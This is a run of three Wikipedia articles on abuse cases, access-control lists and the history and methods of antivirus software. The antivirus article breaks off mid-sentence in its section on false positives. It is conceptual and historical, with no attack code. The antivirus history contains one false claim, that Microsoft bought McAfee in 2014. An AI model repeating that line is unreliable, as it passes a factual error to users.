







From Wikipedia, the free encyclopedia






Abuse case
 
[
1
]
 is a specification model for security requirements used in the software development industry. The term Abuse Case is an adaptation of 
use case
. 
The term was introduced by John McDermott and Chris Fox in 1999, while working at Computer Science Department of the James Madison University.
[
1
]
 As defined by its authors, an abuse case is a 
type of complete interaction between a system and one or more actors, where the results of the interaction are harmful to the system, one of the actors, or one of the stakeholders in the system. We cannot define completeness just in terms of coherent transactions between actors and the system. Instead, we must define abuse in terms of interactions that result in actual harm. A complete abuse case defines an interaction between an actor and the system that  results in harm to a resource associated with one of the actors, one of the stakeholders, or the system itself.


Their notation appears to be similar to 
Misuse cases
, but there are differences reported by Chun Wei in Misuse Cases and Abuse Cases in Eliciting Security Requirements.
[
2
]






Overview
[
edit
]


Use cases
 specify required behaviour of software and other products under development, and are essentially structured stories or 
scenarios
 detailing the normal behavior and usage of the software. Abuse cases extend the 
UML
 notation to model abuse in those systems.



Area of use
[
edit
]


Abuse cases are most commonly used in the field of security requirements elicitation.



Basic concepts
[
edit
]


An abuse case diagram is created together with a corresponding use case diagram, but not in the same diagram (different from 
Misuse case
). There is no new terminology or special symbols introduced for abuse case diagrams. They are drawn with the same symbols as a use case diagram.
To distinguish between the two, the use case diagram and abuse case diagrams are kept separate, and related. Hence abuse cases do not appear in the use case diagrams and vice versa.



See also
[
edit
]


Use case diagram


Misuse case


Threat model
 (software)


References
[
edit
]






^ 
a
 
b
 
John McDermott and Chris Fox (Dec 1999). 
"Using Abuse Case Models for Security Requirements Analysis"
 
(PDF)
. 
Proceedings of the 15th Annual Computer Security Applications Conference, 1999. (ACSAC '99)
: 55–64.




^
 
Chun Wei (Johnny), Sia, Misuse Cases and Abuse Cases in Eliciting Security Requirements, 
http://www.cs.auckland.ac.nz/compsci725s2c/archive/termpapers/csia.pdf














Retrieved from "
https://en.wikipedia.org/w/index.php?title=Abuse_case&oldid=1052733014
"


Category
: 
Software project management











From Wikipedia, the free encyclopedia






List of permissions for a system resource


In 
computer security
, an 
access-control list
 (
ACL
) is a list of permissions
[
a
]
 associated with a 
system resource
 (object or facility). An ACL specifies which 
users
 or 
system processes
 are granted access to resources, as well as what operations are allowed on given resources.
[
1
]
 Each entry in a typical ACL specifies a subject and an operation.  For instance, 



If a file object has an ACL that contains 
(Alice: read,write; Bob: read)
, this would give Alice permission to read and write the file and give Bob permission only to read it.


If the 
RACF
 profile CONSOLE CLASS(TSOAUTH) has an ACL that contains 
(ALICE:READ)
, this would give ALICE permission to use the TSO CONSOLE command.




Implementations
[
edit
]


Many kinds of operating systems implement ACLs or have a historical implementation; the first implementation of ACLs was in the 
filesystem
 of 
Multics
 in 1965.
[
2
]
[
3
]




Filesystem ACLs
[
edit
]


A 
filesystem
 ACL is a 
data structure
 (usually a table) containing entries that specify individual user or 
group
 rights to specific system objects such as programs, 
processes
, or files. These entries are known as access-control entries (ACEs) in the Microsoft 
Windows NT
,
[
4
]
 
OpenVMS
, and 
Unix-like
 
operating systems
 such as 
Linux
, 
macOS
, and 
Solaris
. Each accessible object contains an identifier to its ACL. The privileges or permissions determine specific access rights, such as whether a user can read from, write to, or 
execute
 an object. In some implementations, an ACE can control whether or not a user, or group of users, may alter the ACL on an object.

One of the first operating systems to provide filesystem ACLs was 
Multics
. 
PRIMOS
 featured ACLs at least as early as 1984.
[
5
]


In the 1990s the ACL and 
RBAC
 models were extensively tested
[
by whom?
]
 and used to administer file permissions.



POSIX ACL
[
edit
]


POSIX
 1003.1e/1003.2c working group made an effort to standardize ACLs, resulting in what is now known as "POSIX.1e ACL" or simply "POSIX ACL".
[
6
]
 The POSIX.1e/POSIX.2c drafts were withdrawn in 1997 due to participants losing interest for funding the project and turning to more powerful alternatives such as NFSv4 ACL.
[
7
]
 As of December 2019
[update]
, no live sources of the draft could be found on the Internet, but it can still be found in the 
Internet Archive
.
[
8
]


Most of the Unix and Unix-like operating systems (e.g. 
Linux
 since 2.5.46 or November 2002,
[
9
]
 
FreeBSD
, or 
Solaris
) support POSIX.1e ACLs (not necessarily draft 17). ACLs are usually stored in the extended attributes of a file on these systems.



NFSv4 ACL
[
edit
]


NFSv4
 ACLs are much more powerful than POSIX draft ACLs. Unlike draft POSIX ACLs, NFSv4 ACLs are defined by an actually published standard, as part of the 
Network File System
.

NFSv4 ACLs are supported by many Unix and Unix-like operating systems. Examples include 
AIX
, 
FreeBSD
,
[
10
]
 
Mac OS X
 beginning with version 10.4 ("
Tiger
"), or 
Solaris
 with 
ZFS
 filesystem,
[
11
]
 support 
NFSv4
 ACLs, which are part of the NFSv4 standard. There are two experimental implementations of NFSv4 ACLs for Linux: NFSv4 ACLs support for 
Ext3
 filesystem
[
12
]
 and the more recent 
Richacls
, which brings NFSv4 ACLs support for 
Ext4
 filesystem.
[
13
]
 As with POSIX ACLs, NFSv4 ACLs are usually stored as extended attributes on Unix-like systems.

NFSv4 ACLs are organized nearly identically to the Windows NT ACLs used in 
NTFS
.
[
14
]
 NFSv4.1 ACLs are a superset of both NT ACLs and POSIX draft ACLs.
[
15
]
 
Samba
 supports saving the NT ACLs of SMB-shared files in many ways, one of which is as NFSv4-encoded ACLs.
[
16
]




Active Directory ACLs
[
edit
]


Microsoft
's 
Active Directory
 service implements an 
LDAP
 server that store and disseminate configuration information about users and computers in a domain.
[
17
]
 Active Directory extends the LDAP specification by adding the same type of access-control list mechanism as Windows NT uses for the NTFS filesystem. Windows 2000 then extended the syntax for access-control entries such that they could not only grant or deny access to entire LDAP objects, but also to individual attributes within these objects.
[
18
]




Networking ACLs
[
edit
]


On some types of proprietary computer hardware (in particular, 
routers
 and 
switches
), an access-control list provides rules that are applied to 
port numbers
 or 
IP addresses
 that are available on a 
host
 or other 
layer 3
, each with a list of hosts and/or networks permitted to use the service. Although it is additionally possible to configure access-control lists based on network 
domain names
, this is a questionable idea because individual 
TCP
, 
UDP
, and 
ICMP
 headers do not contain domain names. Consequently, the device enforcing the access-control list must separately 
resolve names
 to numeric addresses. This presents an additional 
attack surface
 for an attacker who is seeking to compromise security of the system which the access-control list is protecting. Both individual 
servers
 and 
routers
 can have network ACLs. Access-control lists can generally be configured to control both inbound and outbound traffic, and in this context they are similar to 
firewalls
. Like firewalls, ACLs could be subject to security regulations and standards such as 
PCI DSS
.



SQL implementations
[
edit
]


ACL algorithms have been ported to 
SQL
 and to 
relational database systems
. Many "modern" (2000s and 2010s) 
SQL
-based systems, like 
enterprise resource planning
 and 
content management
 systems, have used ACL models in their administration modules.



Comparing with RBAC
[
edit
]


The main alternative to the ACL model is the 
role-based access-control
 (RBAC) model.  A "minimal RBAC model", 
RBACm
, can be compared with an ACL mechanism, 
ACLg
, where only groups are permitted as entries in the ACL. Barkley (1997)
[
19
]
 showed that 
RBACm
 and 
ACLg
 are equivalent.

In modern SQL implementations, ACLs also manage groups and inheritance in a hierarchy of groups. So "modern ACLs" can express all that RBAC express and are notably powerful (compared to "old ACLs") in their ability to express access-control policy in terms of the way in which administrators view organizations.

For data interchange, and for "high-level comparisons", ACL data can be translated to 
XACML
.
[
20
]




See also
[
edit
]


Access token manager


Cacls


Capability-based security


C-list


Confused deputy problem


DACL


Extended file attributes


File-system permissions


Privilege (computing)


Role-based access control
 (RBAC)


Notes
[
edit
]






^
 
E.g., 
File-system permissions
, permission to perform specific action.






References
[
edit
]






^
 
R. Shirey (August 2007). 
Internet Security Glossary, Version 2
. 
doi
:
10.17487/RFC4949
. 
RFC
 
4949
. Retrieved 
May 19,
 2023
.




^
 
Richard E. Smith. 
Elementary Information Security
. p. 150.




^
 
Daley, R. C.; Neumann, P. G. (1965). 
"A general-purpose file system for secondary storage"
. 
AFIPS '65 (Fall, part I): Proceedings of the November 30--December 1, 1965, fall joint computer conference, part I
. ACM Press. p. 213. 
doi
:
10.1145/1463891.1463915
.




^
 
"Managing Authorization and Access Control"
. 
Microsoft Learn
. 2009-09-11
. Retrieved 
2024-05-15
.




^
 
"P.S.I. Pacer Software, Inc. Gnet-II revision 3.0"
. Communications. 
Computerworld
. Vol. 18, no. 21. 1984-05-21. p. 54. 
ISSN
 
0010-4841
. Retrieved 
2017-06-30
. 
The new version of Gnet-II (revision 3.0) has added a line-security mechanism which is implemented under the Primos ACL subsystem.




^
 
Grünbacher, Andreas. 
"POSIX Access Control Lists on Linux"
. 
Usenix
. Retrieved 
12 December
 2019
.




^
 
wurtzkurdle. 
"Why was POSIX.1e withdrawn?"
. 
Unix StackExchange
. Retrieved 
12 December
 2019
.




^
 
Trümper, Winfried (February 28, 1999). 
"Summary about Posix.1e"
. Archived from 
the original
 on 2008-07-23.




^
 
"Red Hat Enterprise Linux AS 3 Release Notes (x86 Edition)"
. 
Red Hat
. 2003. Archived from 
the original
 on 2013-12-02
. Retrieved 
2013-04-08
. 
EA (Extended Attributes) and ACL (Access Control Lists) functionality is now available for ext3 file systems. In addition, ACL functionality is available for NFS.




^
 
"NFSv4 ACLs"
. 
FreeBSD
. 2011-09-12
. Retrieved 
2013-04-08
.




^
 
"Chapter 8 Using ACLs and Attributes to Protect ZFS Files"
. 
Oracle Corporation
. 2009-10-01
. Retrieved 
2013-04-08
.




^
 
Grünbacher, Andreas (May 2008). 
"Native NFSv4 ACLs on Linux"
. 
SUSE
. Archived from 
the original
 on 2013-06-20
. Retrieved 
2013-04-08
.




^
 
Grünbacher, Andreas (July–September 2010). 
"Richacls – Native NFSv4 ACLs on Linux"
. bestbits.at. Archived from 
the original
 on 2013-03-20
. Retrieved 
2013-04-08
.




^
 
"ACLs"
. 
Linux NFS
.




^
 
"Mapping Between NFSv4 and Posix Draft ACLs"
.




^
 
"vfs_nfs4acl_xattr(8)"
. 
Samba Manual
.




^
 
"[MS-ADTS]: Active Directory Technical Specification"
.




^
 
Swift, Michael M. (November 2002). "Improving the granularity of access control for 
Windows 2000
". 
ACM Transactions on Information and System Security
. 
5
 (4): 398–437. 
doi
:
10.1145/581271.581273
. 
S2CID
 
10702162
.




^
 
J. Barkley (1997) "
Comparing simple role based access control models and access control lists
", In "Proceedings of the second ACM workshop on Role-based access control", pages 127-132.




^
 
G. Karjoth, A. Schade and E. Van Herreweghen (2008) "
Implementing ACL-based Policies in XACML
", In "2008 Annual Computer Security Applications Conference".






Further reading
[
edit
]




Rhodes, Tom. 
"File System Access Control Lists (ACLs)"
. 
FreeBSD Handbook
. Retrieved 
2013-04-08
.


Michael Fox; John Giordano; Lori Stotler; Arun Thomas (2005-08-24). 
"SELinux and grsecurity: A Case Study Comparing Linux Security Kernel Enhancements"
 
(PDF)
. 
University of Virginia
. Archived from 
the original
 
(PDF)
 on 2012-02-24
. Retrieved 
2013-04-08
.


Hinrichs, Susan (2005). 
"Operating System Security"
. 
CyberSecurity Spring 2005
. 
University of Illinois
. Archived from 
the original
 on 2012-03-04
. Retrieved 
2013-04-08
.


Mitchell, John. 
"Access Control and Operating System Security"
 
(PDF)
. 
Stanford University
. Retrieved 
2013-04-08
.


Clarkson, Michael. 
"Access Control"
. 
Cornell University
. Retrieved 
2013-04-08
.


Klein, Helge (2009-03-12). 
"Permissions: A Primer, or: DACL, SACL, Owner, SID and ACE Explained"
. Retrieved 
2013-04-08
.


"Access Control Lists"
. 
Microsoft Learn
. 2023-02-07
. Retrieved 
2024-05-15
.


"How Permissions Work"
. 
Microsoft Learn
. 2013-07-03
. Retrieved 
2024-05-15
.












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Access-control_list&oldid=1239758836
"


Category
: 
Computer access control
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles with specifically marked weasel-worded phrases from June 2017
Articles containing potentially dated statements from December 2019
All articles containing potentially dated statements











From Wikipedia, the free encyclopedia






Computer software to defend against malicious computer viruses


"Antivirus" redirects here. For the medication, see 
Antiviral drug
.






ClamTk
, an open-source antivirus based on the 
ClamAV
 antivirus 
engine
, was originally developed by Tomasz Kojm in 2001.


Antivirus software
 (abbreviated to 
AV software
), also known as 
anti-malware
, is a 
computer program
 used to prevent, detect, and remove 
malware
.

Antivirus software was originally developed to detect and remove 
computer viruses
, hence the name. However, with the proliferation of other 
malware
, antivirus software started to protect against other computer threats. Some products also include protection from malicious 
URLs
, 
spam
, and 
phishing
.
[
1
]






History
[
edit
]


Further information: 
History of computer viruses


See also: 
Timeline of computer viruses and worms


1971–1980 period (pre-antivirus days)
[
edit
]


The first known computer virus appeared in 1971 and was dubbed the "
Creeper virus
".
[
2
]
 This computer virus infected 
Digital Equipment Corporation
's (
DEC
) 
PDP-10
 mainframe computers running the 
TENEX
 operating system.
[
3
]
[
4
]


The Creeper virus was eventually deleted by a program created by 
Ray Tomlinson
 and known as "
The Reaper
".
[
5
]
 Some people consider "The Reaper" the first antivirus software ever written – it may be the case, but it is important to note that the Reaper was actually a virus itself specifically designed to remove the Creeper virus.
[
5
]
[
6
]


The Creeper virus was followed by several other viruses. The first known that appeared "in the wild" was "
Elk Cloner
", in 1981, which infected 
Apple II
 computers.
[
7
]
[
8
]
[
9
]


In 1983, the term 
"computer virus"
 was coined by 
Fred Cohen
 in one of the first ever published academic papers on 
computer viruses
.
[
10
]
 Cohen used the term 
"computer virus"
 to describe programs that: 
"affect other computer programs by modifying them in such a way as to include a (possibly evolved) copy of itself."
[
11
]
 (note that a more recent definition of 
computer virus
 has been given by the Hungarian security researcher 
Péter Szőr
: 
"a code that recursively replicates a possibly evolved copy of itself"
).
[
12
]
[
13
]


The first 
IBM PC compatible
 "in the wild" computer virus, and one of the first real widespread infections, was "
Brain
" in 1986. From then, the number of viruses has grown exponentially.
[
14
]
[
15
]
 Most of the computer viruses written in the early and mid-1980s were limited to self-reproduction and had no specific damage routine built into the code. That changed when more and more programmers became acquainted with computer virus programming and created viruses that manipulated or even destroyed data on infected computers.
[
16
]


Before 
internet
 connectivity was widespread, computer viruses were typically spread by infected 
floppy disks
. Antivirus software came into use, but was updated relatively infrequently. During this time, virus checkers essentially had to check executable files and the boot sectors of floppy disks and hard disks. However, as internet usage became common, viruses began to spread online.
[
17
]




1980–1990 period (early days)
[
edit
]


There are competing claims for the innovator of the first antivirus product. Possibly, the first publicly documented removal of an "in the wild" computer virus (the "Vienna virus") was performed by 
Bernd Fix
 in 1987.
[
18
]
[
19
]


In 1987, Andreas Lüning and Kai Figge, who founded 
G Data Software
 in 1985, released their first antivirus product for the 
Atari ST
 platform.
[
20
]
 In 1987, the 
Ultimate Virus Killer (UVK)
 was also released.
[
21
]
 This was the de facto industry standard virus killer for the 
Atari ST
 and 
Atari Falcon
, the last version of which (version 9.0) was released in April 2004.
[
citation needed
]
 In 1987, in the United States, 
John McAfee
 founded the 
McAfee
 company and, at the end of that year, he released the first version of 
VirusScan
.
[
22
]
 Also in 1987 (in 
Czechoslovakia
), Peter Paško, 
Rudolf Hrubý
, and Miroslav Trnka created the first version of 
NOD
 antivirus.
[
23
]
[
24
]


In 1987, Fred Cohen wrote that 
there is no algorithm that can perfectly detect all possible computer viruses
.
[
25
]


Finally, at the end of 1987, the first two 
heuristic
 antivirus utilities were released: 
Flushot Plus
 by 
Ross Greenberg
[
26
]
[
27
]
[
28
]
 and 
Anti4us
 by Erwin Lanting.
[
29
]
 In his 
O'Reilly
 book, 
Malicious Mobile Code: Virus Protection for Windows
, Roger Grimes described Flushot Plus as "the first holistic program to fight malicious mobile code (MMC)."
[
30
]


However, the kind of heuristic used by early AV engines was totally different from those used today. The first product with a heuristic engine resembling modern ones was 
F-PROT
 in 1991.
[
31
]
 Early heuristic engines were based on dividing the binary into different sections: data section, code section (in a legitimate binary, it usually starts always from the same location). Indeed, the initial viruses re-organized the layout of the sections, or overrode the initial portion of a section in order to jump to the very end of the file where malicious code was located—only going back to resume execution of the original code. This was a very specific pattern, not used at the time by any legitimate software, which represented an elegant heuristic to catch suspicious code. Other kinds of more advanced heuristics were later added, such as suspicious section names, incorrect header size, regular expressions, and partial pattern in-memory matching.

In 1988, the growth of antivirus companies continued. In Germany, Tjark Auerbach founded 
Avira
 (
H+BEDV
 at the time) and released the first version of 
AntiVir
 (named 
"Luke Filewalker"
 at the time). In 
Bulgaria
, Vesselin Bontchev released his first freeware antivirus program (he later joined 
FRISK Software
). Also Frans Veldman released the first version of 
ThunderByte Antivirus
, also known as 
TBAV
 (he sold his company to 
Norman Safeground
 in 1998). In 
Czechoslovakia
, 
Pavel Baudiš
 and Eduard Kučera founded 
Avast Software
 (at the time 
ALWIL Software
) and released their first version of avast! antivirus. In June 1988, in 
South Korea
, 
Ahn Cheol-Soo
 released its first antivirus software, called 
V1
 (he founded AhnLab later in 1995). Finally, in autumn 1988, in the United Kingdom, Alan Solomon founded S&S International and created his 
Dr. Solomon's Anti-Virus Toolkit
 (although he launched it commercially only in 1991 – in 1998 Solomon's company was acquired by 
McAfee
). In November 1988 a professor at the Panamerican University in Mexico City named Alejandro E. Carriles copyrighted the first antivirus software in Mexico under the name "Byte Matabichos" (Byte Bugkiller) to help solve the rampant virus infestation among students.
[
32
]


Also in 1988, a mailing list named VIRUS-L
[
33
]
 was started on the 
BITNET
/
EARN
 network where new viruses and the possibilities of detecting and eliminating viruses were discussed. Some members of this mailing list were: Alan Solomon, 
Eugene Kaspersky
 (
Kaspersky Lab
), 
Friðrik Skúlason
 (
FRISK Software
), 
John McAfee
 (
McAfee
), Luis Corrons (
Panda Security
), 
Mikko Hyppönen
 (
F-Secure
), 
Péter Szőr
, Tjark Auerbach (
Avira
) and Vesselin Bontchev (
FRISK Software
).
[
33
]


In 1989, in 
Iceland
, 
Friðrik Skúlason
 created the first version of 
F-PROT Anti-Virus
 (he founded 
FRISK Software
 only in 1993). Meanwhile, in the United States, 
Symantec
 (founded by Gary Hendrix in 1982) launched its first 
Symantec antivirus for Macintosh
 (SAM).
[
34
]
[
35
]
 SAM 2.0, released March 1990, incorporated technology allowing users to easily update SAM to intercept and eliminate new viruses, including many that didn't exist at the time of the program's release.
[
36
]


In the end of the 1980s, in United Kingdom, Jan Hruska and Peter Lammer founded the security firm 
Sophos
 and began producing their first antivirus and encryption products. In the same period, in Hungary, also 
VirusBuster
 was founded (which has recently being incorporated by 
Sophos
).



1990–2000 period (emergence of the antivirus industry)
[
edit
]


In 1990, in Spain, Mikel Urizarbarrena founded 
Panda Security
 (
Panda Software
 at the time).
[
37
]
 In Hungary, the security researcher 
Péter Szőr
 released the first version of 
Pasteur
 antivirus. In Italy, Gianfranco Tonello created the first version of 
VirIT eXplorer
 antivirus, then founded 
TG Soft
 one year later.
[
38
]


In 1990, the 
Computer Antivirus Research Organization
 (
CARO
) was founded. In 1991, CARO released the 
"Virus Naming Scheme"
, originally written by 
Friðrik Skúlason
 and Vesselin Bontchev.
[
39
]
 Although this naming scheme is now outdated, it remains the only existing standard that most computer security companies and researchers ever attempted to adopt. 
CARO
 members includes: Alan Solomon, Costin Raiu, Dmitry Gryaznov, 
Eugene Kaspersky
, 
Friðrik Skúlason
, 
Igor Muttik
, 
Mikko Hyppönen
, Morton Swimmer, Nick FitzGerald, 
Padgett Peterson
, Peter Ferrie, Righard Zwienenberg and Vesselin Bontchev.
[
40
]
[
41
]


In 1991, in the United States, 
Symantec
 released the first version of 
Norton AntiVirus
. In the same year, in the 
Czech Republic
, Jan Gritzbach and Tomáš Hofer founded 
AVG Technologies
 (
Grisoft
 at the time), although they released the first version of their 
Anti-Virus Guard
 (AVG) only in 1992. On the other hand, in 
Finland
, 
F-Secure
 (founded in 1988 by Petri Allas and Risto Siilasmaa – with the name of Data Fellows) released the first version of their antivirus product. 
F-Secure
 claims to be the first antivirus firm to establish a presence on the World Wide Web.
[
42
]


In 1991, the 
European Institute for Computer Antivirus Research
 (EICAR) was founded to further antivirus research and improve development of antivirus software.
[
43
]
[
44
]


In 1992, in Russia, Igor Danilov released the first version of 
SpiderWeb
, which later became 
Dr.Web
.
[
45
]


In 1994, 
AV-TEST
 reported that there were 28,613 unique malware samples (based on MD5) in their database.
[
46
]


Over time other companies were founded. In 1996, in 
Romania
, 
Bitdefender
 was founded and released the first version of 
Anti-Virus eXpert
 (AVX).
[
47
]
 In 1997, in Russia, 
Eugene Kaspersky
 and 
Natalya Kaspersky
 co-founded security firm 
Kaspersky Lab
.
[
48
]


In 1996, there was also the first "in the wild" 
Linux
 virus, known as 
"
Staog
"
.
[
49
]


In 1999, 
AV-TEST
 reported that there were 98,428 unique malware samples (based on MD5) in their database.
[
46
]




2000–2005 period
[
edit
]


In 2000, Rainer Link and Howard Fuhs started the first open source antivirus engine, called 
OpenAntivirus Project
.
[
50
]


In 2001, Tomasz Kojm released the first version of 
ClamAV
, the first ever open source antivirus engine to be commercialised. In 2007, 
ClamAV
 was bought by 
Sourcefire
,
[
51
]
 which in turn was acquired by 
Cisco Systems
 in 2013.
[
52
]


In 2002, in United Kingdom, 
Morten Lund
 and Theis Søndergaard co-founded the antivirus firm BullGuard.
[
53
]


In 2005, 
AV-TEST
 reported that there were 333,425 unique malware samples (based on MD5) in their database.
[
46
]




2005–2014 period
[
edit
]


In 2007, 
AV-TEST
 reported a number of 5,490,960 new unique malware samples (based on MD5) only for that year.
[
46
]
 In 2012 and 2013, antivirus firms reported a new malware samples range from 300,000 to over 500,000 per day.
[
54
]
[
55
]


Over the years it has become necessary for antivirus software to use several different strategies (e.g. specific email and network protection or low level modules) and detection algorithms, as well as to check an increasing variety of files, rather than just executables, for several reasons:



Powerful 
macros
 used in 
word processor
 applications, such as 
Microsoft Word
, presented a risk. Virus writers could use the macros to write viruses embedded within documents. This meant that computers could now also be at risk from infection by opening documents with hidden attached macros.
[
56
]


The possibility of embedding executable objects inside otherwise non-executable file formats can make opening those files a risk.
[
57
]


Later email programs, in particular Microsoft's 
Outlook Express
 and 
Outlook
, were 
vulnerable
 to viruses embedded in the email body itself. A user's computer could be infected by just opening or previewing a message.
[
58
]


In 2005, 
F-Secure
 was the first security firm that developed an Anti-Rootkit technology, called 
BlackLight
.

Because most users are usually connected to the Internet on a continual basis, 
Jon Oberheide
 first proposed a 
Cloud-based
 antivirus design in 2008.
[
59
]


In February 2008 McAfee Labs added the industry-first cloud-based anti-malware functionality to VirusScan under the name Artemis. It was tested by 
AV-Comparatives
 in February 2008
[
60
]
 and officially unveiled in August 2008 in 
McAfee VirusScan
.
[
61
]


Cloud AV created problems for comparative testing of security software – part of the AV definitions was out of testers control (on constantly updated AV company servers) thus making results non-repeatable. As a result, 
Anti-Malware Testing Standards Organisation
 (AMTSO) started working on method of testing cloud products which was adopted on May 7, 2009.
[
62
]


In 2011, 
AVG
 introduced a similar cloud service, called Protective Cloud Technology.
[
63
]




2014–present: rise of next-gen, market consolidation
[
edit
]


Following the 2013 release of the APT 1 report from 
Mandiant
, the industry has seen a shift towards signature-less approaches to the problem capable of detecting and mitigating 
zero-day attacks
.
[
64
]
 Numerous approaches to address these new forms of threats have appeared, including behavioral detection, artificial intelligence, machine learning, and cloud-based file detection. According to Gartner, it is expected the rise of new entrants, such 
Carbon Black
, 
Cylance
 and 
Crowdstrike
 will force end point protection incumbents into a new phase of innovation and acquisition.
[
65
]


One method from 
Bromium
 involves micro-virtualization to protect desktops from malicious code execution initiated by the end user. Another approach from 
SentinelOne
 and 
Carbon Black
 focuses on behavioral detection by building a full context around every process execution path in real time,
[
66
]
[
67
]
 while 
Cylance
 leverages an artificial intelligence model based on machine learning.
[
68
]


Increasingly, these signature-less approaches have been defined by the media and analyst firms as "next-generation" antivirus
[
69
]
 and are seeing rapid market adoption as certified antivirus replacement technologies by firms such as Coalfire and DirectDefense.
[
70
]
 In response, traditional antivirus vendors such as 
Trend Micro
,
[
71
]
 
Symantec
 and 
Sophos
[
72
]
 have responded by incorporating "next-gen" offerings into their portfolios as analyst firms such as 
Forrester
 and 
Gartner
 have called traditional signature-based antivirus "ineffective" and "outdated".
[
73
]


As of 
Windows 8
, Windows includes its own free antivirus protection under the 
Windows Defender
 brand. Despite bad detection scores in its early days, AV-Test now certifies Defender as one of its top products.
[
74
]
[
75
]
 While it isn't publicly known how the inclusion of antivirus software in Windows affected antivirus sales, Google search traffic for antivirus has declined significantly since 2010.
[
76
]
 In 2014 Microsoft bought McAfee.
[
77
]


Since 2016, there has been a notable amount of consolidation in the industry. 
Avast
 purchased 
AVG
 in 2016 for $1.3 billion.
[
78
]
 
Avira
 was acquired by 
Norton
 owner 
Gen Digital
 (then NortonLifeLock) in 2020 for $360 million.
[
79
]
 In 2021, the Avira division of Gen Digital acquired BullGuard.
[
80
]
 The BullGuard brand was discontinued in 2022 and its customers were migrated to Norton. In 2022, Gen Digital acquired Avast, effectively consolidating four major antivirus brands under one owner.
[
81
]




Identification methods
[
edit
]


In 1987, 
Frederick B. Cohen
 demonstrated that the algorithm which would be able to detect all possible viruses can't possibly exist (like the algorithm which determines 
whether or not the given program halts
).
[
25
]
 However, using different layers of defense, a good detection rate may be achieved.

There are several methods which antivirus engines can use to identify malware:



Sandbox detection
: a particular behavioural-based detection technique that, instead of detecting the behavioural fingerprint at run time, it executes the programs in a 
virtual environment
, logging what actions the program performs. Depending on the actions logged which can include memory usage and network accesses,
[
82
]
 the antivirus engine can determine if the program is malicious or not.
[
83
]
 If not, then, the program is executed in the real environment. Although this technique has shown to be quite effective, given its heaviness and slowness, it is rarely used in end-user antivirus solutions.
[
84
]


Data mining
 techniques
: one of the latest approaches applied in malware detection. 
Data mining
 and 
machine learning
 algorithms are used to try to classify the behaviour of a file (as either malicious or benign) given a series of file features, that are extracted from the file itself.
[
85
]
[
86
]
[
87
]
[
88
]
[
89
]
[
90
]
[
91
]
[
92
]
[
93
]
[
94
]
[
95
]
[
96
]
[
97
]
[
98
]
[
excessive citations
]


Signature-based detection
[
edit
]


Traditional antivirus software relies heavily upon signatures to identify malware.
[
99
]


Substantially, when a malware sample arrives in the hands of an antivirus firm, it is analysed by malware researchers or by dynamic analysis systems. Then, once it is determined to be a malware, a proper signature of the file is extracted and added to the signatures database of the antivirus software.
[
100
]


Although the signature-based approach can effectively contain malware outbreaks, malware authors have tried to stay a step ahead of such software by writing "
oligomorphic
", "
polymorphic
" and, more recently, "
metamorphic
" viruses, which encrypt parts of themselves or otherwise modify themselves as a method of disguise, so as to not match virus signatures in the dictionary.
[
101
]




Heuristics
[
edit
]


Many viruses start as a single infection and through either 
mutation
 or refinements by other attackers, can grow into dozens of slightly different strains, called variants. Generic detection refers to the detection and removal of multiple threats using a single virus definition.
[
102
]


For example, the 
Vundo
 
trojan
 has several family members, depending on the antivirus vendor's classification. 
Symantec
 classifies members of the Vundo family into two distinct categories, 
Trojan.Vundo
 and 
Trojan.Vundo.B
.
[
103
]
[
104
]


While it may be advantageous to identify a specific virus, it can be quicker to detect a virus family through a generic signature or through an inexact match to an existing signature. Virus researchers find common areas that all viruses in a family share uniquely and can thus create a single generic signature. These signatures often contain non-contiguous code, using 
wildcard characters
 where differences lie. These wildcards allow the scanner to detect viruses even if they are padded with extra, meaningless code.
[
105
]
 A detection that uses this method is said to be "heuristic detection".



Rootkit detection
[
edit
]


Main article: 
Rootkit


Anti-virus software can attempt to scan for rootkits. A 
rootkit
 is a type of 
malware
 designed to gain administrative-level control over a computer system without being detected. Rootkits can change how the 
operating system
 functions and in some cases can tamper with the anti-virus program and render it ineffective. Rootkits are also difficult to remove, in some cases requiring a complete re-installation of the operating system.
[
106
]




Real-time protection
[
edit
]


Real-time protection, on-access scanning, background guard, resident shield, autoprotect, and other synonyms refer to the automatic protection provided by most antivirus, anti-spyware, and other anti-malware programs. This monitors computer systems for suspicious activity such as computer viruses, spyware, adware, and other malicious objects. Real-time protection detects threats in opened files and scans apps in real-time as they are installed on the device.
[
107
]
 When inserting a CD, opening an email, or browsing the web, or when a file already on the computer is opened or executed.
[
108
]




Issues of concern
[
edit
]


Unexpected renewal costs
[
edit
]


Some commercial antivirus software 
end-user license agreements
 include a clause that the 
subscription
 will be automatically renewed, and the purchaser's credit card automatically billed, at the renewal time without explicit approval. For example, 
McAfee
 requires users to unsubscribe at least 60 days before the expiration of the present subscription
[
109
]
 while 
Bitdefender
 sends notifications to unsubscribe 30 days before the renewal.
[
110
]
 
Norton AntiVirus
 also renews subscriptions automatically by default.
[
111
]




Rogue security applications
[
edit
]


Main article: 
Rogue security software


Some apparent antivirus programs are actually 
malware
 masquerading as legitimate software, such as 
WinFixer
, 
MS Antivirus
, and 
Mac Defender
.
[
112
]




Problems caused by false positives
[
edit
]


A "false positive" or "false alarm" is when antivirus software identifies a non-malicious file as malware. When this happens, it can cause serious problems. For example, if an antivirus program is configured to immediately delete or quarantine infected files, as is common on 
Microsoft Windows
 antivirus applications, a false positive in an essential file can render the Windows 
operating system
 or some applications unusable.
[
113
]
 Recovering from such damage to critical software infrastructure incurs technical support costs and businesses can be forced to close whilst remedial action is undertaken.
[
114
]
[
115
]


Examples of serious false-positives:



May 2007:
 a faulty virus signature issued by 
Symantec
 mistakenly removed essential operating system files, leaving thousands of PCs unable to 
boot
.
[
116
]


May 2007:
 the 
executable file
 required by 
Pegasus Mail
 on Windows was falsely detected by 
Norton AntiVirus
 as being a Trojan and it was automatically removed, preventing Pegasus Mail from running. Norton AntiVirus had falsely identified three releases of Pegasus Mail as malware, and would delete the Pegasus Mail installer file when that happened.
[
117
]
 In response to this Pegasus Mail stated:


On the basis that Norton/Symantec has done this for every one of the last three releases of Pegasus Mail, we can only condemn this product as too flawed to use, and recommend in the strongest terms that our users cease using it in favour of alternative, less buggy anti-virus packages.
[
117
]


April 2010:
 
McAfee VirusScan
 detected svchost.exe, a normal Windows binary, as a virus on machines running 
Windows XP
 with Service Pack 3, causing a reboot loop and loss of all network access.
[
118
]
[
119
]


December 2010:
 a faulty update on the 
AVG
 anti-virus suite damaged 64-bit versions of 
Windows 7
, rendering it unable to boot, due to an endless boot loop created.
[
120
]


October 2011:
 
Microsoft Security Essentials
 (MSE) removed the 
Google Chrome
